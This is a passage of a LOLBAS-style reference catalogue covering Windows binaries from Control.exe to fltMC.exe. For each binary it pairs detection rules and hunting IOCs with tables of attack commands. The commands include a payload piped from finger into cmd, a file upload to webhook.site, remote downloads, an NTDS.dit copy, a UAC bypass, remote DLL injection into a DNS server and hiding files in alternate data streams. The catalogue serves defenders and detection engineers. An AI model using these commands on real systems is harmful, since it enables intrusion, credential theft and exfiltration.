- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules-emerging-threats/2021/Exploits/CVE-2021-40444/proc_creation_win_exploit_cve_2021_40444.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_control_dll_load.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [Elastic](https://github.com/elastic/detection-rules/blob/0875c1e4c4370ab9fbf453c8160bb5abc8ad95e7/rules/windows/defense_evasion_execution_control_panel_suspicious_args.toml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1218.002` | `User` | `control.exe c:\windows\tasks\file.txt:evil.dll` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |

### `Csc.exe` (`yml/OSBinaries/Csc.yml`)
- **Description:** Binary file used by .NET to compile C# code
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Csc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Csc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Csc.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe`
- **Key Forensic / Hunt IOCs:** `Csc.exe should normally not run as System account unless it is used for development.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_csc_susp_parent.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_csc_susp_folder.yml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_dotnet_compiler_parent_process.toml), [Elastic](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_execution_msbuild_started_unusal_process.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Compile** | `T1127` | `User` | `csc.exe -out:My.exe File.cs` | Compile attacker code on system. Bypass defensive counter measures. |
| **Compile** | `T1127` | `User` | `csc -target:library File.cs` | Compile attacker code on system. Bypass defensive counter measures. |

### `Cscript.exe` (`yml/OSBinaries/Cscript.yml`)
- **Description:** Binary used to execute scripts in Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Cscript.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Cscript.yml`
- **Default Windows Paths:** `C:\Windows\System32\cscript.exe`, `C:\Windows\SysWOW64\cscript.exe`
- **Key Forensic / Hunt IOCs:** `Cscript.exe executing files from alternate data streams`; `DotNet CLR libraries loaded into cscript.exe`; `DotNet CLR Usage Log - cscript.exe.log`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml), [Elastic](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/command_and_control_remote_file_copy_scripts.toml), [Elastic](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `cscript //e:vbscript c:\ads\file.txt:script.vbs` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |

### `CustomShellHost.exe` (`yml/OSBinaries/CustomShellHost.yml`)
- **Description:** A host process that is used by custom shells when using Windows in Kiosk mode.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/CustomShellHost.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/CustomShellHost.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/CustomShellHost.yml`
- **Default Windows Paths:** `C:\Windows\System32\CustomShellHost.exe`
- **Key Forensic / Hunt IOCs:** `CustomShellHost.exe is unlikely to run on normal workstations`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_customshellhost.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `CustomShellHost.exe` | Can be used to evade defensive counter-measures |

### `DataSvcUtil.exe` (`yml/OSBinaries/DataSvcUtil.yml`)
- **Description:** DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/DataSvcUtil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/DataSvcUtil.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`
- **Key Forensic / Hunt IOCs:** `The DataSvcUtil.exe tool is installed in the .NET Framework directory.`; `Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS.`; `Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Upload** | `T1567` | `User` | `DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile` | Upload file |

### `Desktopimgdownldr.exe` (`yml/OSBinaries/Desktopimgdownldr.yml`)
- **Description:** Windows binary used to configure lockscreen/desktop image
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Desktopimgdownldr.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Desktopimgdownldr.yml`
- **Default Windows Paths:** `c:\windows\system32\desktopimgdownldr.exe`
- **Key Forensic / Hunt IOCs:** `desktopimgdownldr.exe that creates non-image file`; `Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml), [Elastic](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr` | Download arbitrary files from a web server |

### `DeviceCredentialDeployment.exe` (`yml/OSBinaries/DeviceCredentialDeployment.yml`)
- **Description:** Device Credential Deployment
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/DeviceCredentialDeployment.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/DeviceCredentialDeployment.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/DeviceCredentialDeployment.yml`
- **Default Windows Paths:** `C:\Windows\System32\DeviceCredentialDeployment.exe`
- **Key Forensic / Hunt IOCs:** `DeviceCredentialDeployment.exe should not be run on a normal workstation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_device_credential_deployment.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Conceal** | `T1564` | `User` | `DeviceCredentialDeployment` | Can be used to stealthily run a console application (e.g. cmd.exe) in the background |

### `Dfsvc.exe` (`yml/OSBinaries/Dfsvc.yml`)
- **Description:** ClickOnce engine in Windows used by .NET
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Dfsvc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Dfsvc.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe`, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127` | `User` | `rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo` | Use binary to bypass Application whitelisting |

### `Diantz.exe` (`yml/OSBinaries/Diantz.yml`)
- **Description:** Binary that package existing files into a cabinet (.cab) file
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Diantz.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Diantz.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Diantz.yml`
- **Default Windows Paths:** `c:\windows\system32\diantz.exe`, `c:\windows\syswow64\diantz.exe`
- **Key Forensic / Hunt IOCs:** `diantz storing data into alternate data streams.`; `diantz getting a file from a remote machine or the internet.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_diantz_ads.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_diantz_remote_cab.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab` | Hide data compressed into an Alternate Data Stream. |
| **Download** | `T1105` | `User` | `diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab` | Download and compress into a cab file. |

### `Diskshadow.exe` (`yml/OSBinaries/Diskshadow.yml`)
- **Description:** Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Diskshadow.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Diskshadow.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Diskshadow.yml`
- **Default Windows Paths:** `C:\Windows\System32\diskshadow.exe`, `C:\Windows\SysWOW64\diskshadow.exe`
- **Key Forensic / Hunt IOCs:** `Child process from diskshadow.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_diskshadow.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.003` | `User` | `diskshadow.exe /s c:\test\diskshadow.txt` | Use diskshadow to exfiltrate data from VSS such as NTDS.dit |
| **Execute** | `T1202` | `User` | `diskshadow> exec calc.exe` | Use diskshadow to bypass defensive counter measures |

### `Dnscmd.exe` (`yml/OSBinaries/Dnscmd.yml`)
- **Description:** A command-line interface for managing DNS servers
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Dnscmd.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Dnscmd.yml`
- **Default Windows Paths:** `C:\Windows\System32\Dnscmd.exe`, `C:\Windows\SysWOW64\Dnscmd.exe`
- **Key Forensic / Hunt IOCs:** `Dnscmd.exe loading dll from UNC/arbitrary path`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1543.003` | `DNS admin` | `dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll` | Remotely inject dll to dns server |

### `Esentutl.exe` (`yml/OSBinaries/Esentutl.yml`)
- **Description:** Binary for working with Microsoft Joint Engine Technology (JET) database
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Esentutl.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Esentutl.yml`
- **Default Windows Paths:** `C:\Windows\System32\esentutl.exe`, `C:\Windows\SysWOW64\esentutl.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_esentutl_params.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/registry/registry_event/registry_event_esentutl_volume_shadow_copy_service_keys.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/esentutl_sam_copy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Copy** | `T1105` | `User` | `esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o` | Copies files from A to B |
| **ADS** | `T1564.004` | `User` | `esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o` | Copy file and hide it in an alternate data stream as a defensive counter measure |
| **ADS** | `T1564.004` | `User` | `esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o` | Extract hidden file within alternate data streams |
| **ADS** | `T1564.004` | `User` | `esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o` | Copy file and hide it in an alternate data stream as a defensive counter measure |
| **Download** | `T1564.004` | `User` | `esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o` | Use to copy files from one unc path to another |
| **Copy** | `T1003.003` | `Admin` | `esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit` | Copy/extract a locked file such as the AD Database |

### `Eventvwr.exe` (`yml/OSBinaries/Eventvwr.yml`)
- **Description:** Displays Windows Event Logs in a GUI window.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Eventvwr.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Eventvwr.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Eventvwr.yml`
- **Default Windows Paths:** `C:\Windows\System32\eventvwr.exe`, `C:\Windows\SysWOW64\eventvwr.exe`
- **Key Forensic / Hunt IOCs:** `eventvwr.exe launching child process other than mmc.exe`; `Creation or modification of the registry value HKCU\Software\Classes\mscfile\shell\open\command`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_eventvwr.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/registry/registry_set/registry_set_uac_bypass_eventvwr.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/file/file_event/file_event_win_uac_bypass_eventvwr.yml), [Elastic](https://github.com/elastic/detection-rules/blob/d31ea6253ea40789b1fc49ade79b7ec92154d12a/rules/windows/privilege_escalation_uac_bypass_event_viewer.toml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/eventvwr_uac_bypass.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **UAC Bypass** | `T1548.002` | `User` | `eventvwr.exe` | Execute a binary or script as a high-integrity process without a UAC prompt. |
| **UAC Bypass** | `T1548.002` | `Administrator` | `ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c calc > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe` | Execute a command to bypass security restrictions that limit the use of command-line interpreters. |

### `Expand.exe` (`yml/OSBinaries/Expand.yml`)
- **Description:** Binary that expands one or more compressed files
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Expand.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Expand.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Expand.yml`
- **Default Windows Paths:** `C:\Windows\System32\Expand.exe`, `C:\Windows\SysWOW64\Expand.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `expand \\webdav\folder\file.bat c:\ADS\file.bat` | Use to copies the source file to the destination file |
| **Copy** | `T1105` | `User` | `expand c:\ADS\file1.bat c:\ADS\file2.bat` | Copies files from A to B |
| **ADS** | `T1564.004` | `User` | `expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat` | Copies files from A to B |

### `Explorer.exe` (`yml/OSBinaries/Explorer.yml`)
- **Description:** Binary used for managing files and system components within Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Explorer.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Explorer.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Explorer.yml`
- **Default Windows Paths:** `C:\Windows\explorer.exe`, `C:\Windows\SysWOW64\explorer.exe`
- **Key Forensic / Hunt IOCs:** `Multiple instances of explorer.exe or explorer.exe using the /root command line is suspicious.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_explorer_break_process_tree.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_explorer_lolbin_execution.yml), [Elastic](https://github.com/elastic/detection-rules/blob/f2bc0c685d83db7db395fc3dc4b9729759cd4329/rules/windows/initial_access_via_explorer_suspicious_child_parent_args.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `explorer.exe /root,"C:\Windows\System32\calc.exe"` | Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion. |
| **Execute** | `T1202` | `User` | `explorer.exe C:\Windows\System32\notepad.exe` | Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion. |

### `Extexport.exe` (`yml/OSBinaries/Extexport.yml`)
- **Description:** Load a DLL located in the c:\test folder with a specific name.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Extexport.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Extexport.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Extexport.yml`
- **Default Windows Paths:** `C:\Program Files\Internet Explorer\Extexport.exe`, `C:\Program Files (x86)\Internet Explorer\Extexport.exe`
- **Key Forensic / Hunt IOCs:** `Extexport.exe loads dll and is execute from other folder the original path`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extexport.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `Extexport.exe c:\test foo bar` | Execute dll file |

### `Extrac32.exe` (`yml/OSBinaries/Extrac32.yml`)
- **Description:** Extract to ADS, copy or overwrite a file with Extrac32.exe
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Extrac32.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Extrac32.yml`
- **Default Windows Paths:** `C:\Windows\System32\extrac32.exe`, `C:\Windows\SysWOW64\extrac32.exe`
- **Detection Rules:** [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extrac32.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extrac32_ads.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | Extract data from cab file and hide it in an alternate data stream. |
| **ADS** | `T1564.004` | `User` | `extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | Extract data from cab file and hide it in an alternate data stream. |
| **Download** | `T1105` | `User` | `extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | Download file from UNC/WEBDav |
| **Copy** | `T1105` | `User` | `extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe` | Copy file |

### `Findstr.exe` (`yml/OSBinaries/Findstr.yml`)
- **Description:** Write to ADS, discover, or download files with Findstr.exe
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Findstr.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Findstr.yml`
- **Default Windows Paths:** `C:\Windows\System32\findstr.exe`, `C:\Windows\SysWOW64\findstr.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_findstr.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe` | Add a file to an alternate data stream to hide from defensive counter measures |
| **ADS** | `T1564.004` | `User` | `findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe` | Add a file to an alternate data stream from a webdav server to hide from defensive counter measures |
| **Credentials** | `T1552.001` | `User` | `findstr /S /I cpassword \\sysvol\policies\*.xml` | Find credentials stored in cpassword attrbute |
| **Download** | `T1105` | `User` | `findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe` | Download/Copy file from webdav server |

### `Finger.exe` (`yml/OSBinaries/Finger.yml`)
- **Description:** Displays information about a user or users on a specified remote computer that is running the Finger service or daemon
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Finger.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Finger.yml`
- **Default Windows Paths:** `c:\windows\system32\finger.exe`, `c:\windows\syswow64\finger.exe`
- **Key Forensic / Hunt IOCs:** `finger.exe should not be run on a normal workstation.`; `finger.exe connecting to external resources.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `finger user@example.host.com \| more +2 \| cmd` | Download malicious payload |

### `fltMC.exe` (`yml/OSBinaries/FltMC.yml`)
- **Description:** Filter Manager Control Program used by Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/FltMC.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/FltMC.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/FltMC.yml`
- **Default Windows Paths:** `C:\Windows\System32\fltMC.exe`
- **Key Forensic / Hunt IOCs:** `4688 events with fltMC.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_fltmc_unload_driver_sysmon.yml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_via_filter_manager.toml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/unload_sysmon_filter_driver.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
